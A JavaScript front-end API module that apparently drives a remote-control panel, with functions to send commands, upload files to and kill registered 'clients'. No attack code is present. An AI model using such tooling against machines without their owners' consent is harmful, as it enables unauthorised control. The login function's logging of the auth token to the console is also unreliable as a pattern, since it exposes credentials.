import axios from "../axios";

export const logout = async () => {
    const result = await axios({
        headers: {
            'x-access-token': localStorage.getItem('token')
        },
        method: 'get',
        url: '/api/logout',
        timeout: 100
    });
    return result.status === 200;
}

export const login = async (values) => {
    return await axios({
        method: 'post',
        url: '/web/login',
        data: {
            username: values.username,
            password: values.password,
        }
    }).then((token) => {
        console.log(token)
        return token.data
    }).catch(() => console.log("Login error!"));
}

export const register = async (values) => {
    const result = await axios({
        method: 'post',
        url: '/web/register',
        data: {
            username: values.username,
            password: values.password,
        }
    });
    return result.status === 200;
}

export const sendCommand = async (clientId, command) => {
    const result = await axios({
        method: 'post',
        headers: {
            'x-access-token': localStorage.getItem('token')
        },
        url: "/api/commands/add",
        data: {
            client_id: clientId,
            command: command
        }
    });
    return result.status === 200;
}

export const uploadFile = async (formData, clientId) => {
    const result = await axios.post("/api/commands/upload", formData, {
        headers: {
            "client_id": clientId,
            "Content-Type": "multipart/form-data",
            "x-access-token": localStorage.getItem('token')
        },
    }).then().catch(err => err);
    return result.status === 200;
}

export const killClient = async (clientId) => {
    const result = await axios({
        method: 'post',
        headers: {
            'x-access-token': localStorage.getItem('token')
        },
        url: "/api/clients/kill",
        data: {
            client_id: clientId,
        }
    });
    return result.status === 200;
}

export const checkToken = async () => {
    const result = await axios({
        headers: {
            'x-access-token': localStorage.getItem('token')
        },
        method: 'get',
        url: "/web/auth"
    });
    return result.status === 200;
}

export const getStatistics = async () => {
    const statistics = await axios({
        headers: {
            'x-access-token': localStorage.getItem('token')
        },
        method: 'get',
        url: "/api/clients/statistics"
    })
    return statistics
}

export const getClients = async () => {
    return axios({
        url: `/api/clients`,
        headers: {
            'x-access-token': localStorage.getItem('token')
        }
    })
        .then(data => data.data).catch(() => null)
}

export const getSingleClient = async (clientId) =>{
    return axios({
        url: `/api/clients/client`,
        method:'post',
        headers: {
            'x-access-token': localStorage.getItem('token')
        },
        data:{
            'id':clientId
        }
    })
        .then(data => data.data).catch(() => null)
}